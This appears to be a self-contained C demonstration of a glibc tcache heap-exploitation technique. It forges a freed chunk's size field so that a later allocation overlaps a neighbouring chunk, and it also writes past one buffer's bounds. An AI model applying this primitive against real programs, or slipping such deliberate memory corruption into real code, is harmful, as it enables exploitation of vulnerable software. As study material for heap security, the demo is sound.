#include <stdio.h>
#include <stdlib.h>
#include <stdint.h>
#include <string.h>

int main() {
    intptr_t *p1, *p2, *p3;

    p1 = malloc(0x50 - 8);
    p2 = malloc(0x20 - 8);
    memset(p1, 0x41, 0x50-8);
    memset(p2, 0x41, 0x30-8);
    fprintf(stderr, "Allocated victim chunk with requested size 0x48: %p\n", p1);
    fprintf(stderr, "Allocated sentry element after victim: %p\n", p2);

    int evil_chunk_size = 0x110;
    int evil_region_size = 0x110 - 8;
    fprintf(stderr, "Emulating corruption of the victim's size to 0x110\n");
    *(p1-1) = evil_chunk_size;
    fprintf(stderr, "Freed victim chunk to put it in a different tcache bin\n");
    free(p1);

    p3 = malloc(evil_region_size);
    memset(p3, 0x42, evil_region_size);
    fprintf(stderr, "Requested a chunk of 0x100 bytes\n");
    fprintf(stderr, "p3: %p ~ %p\n", p3, (char *)p3+evil_region_size);
    fprintf(stderr, "p2: %p ~ %p\n", p2, (char *)p2+0x20-8);
}
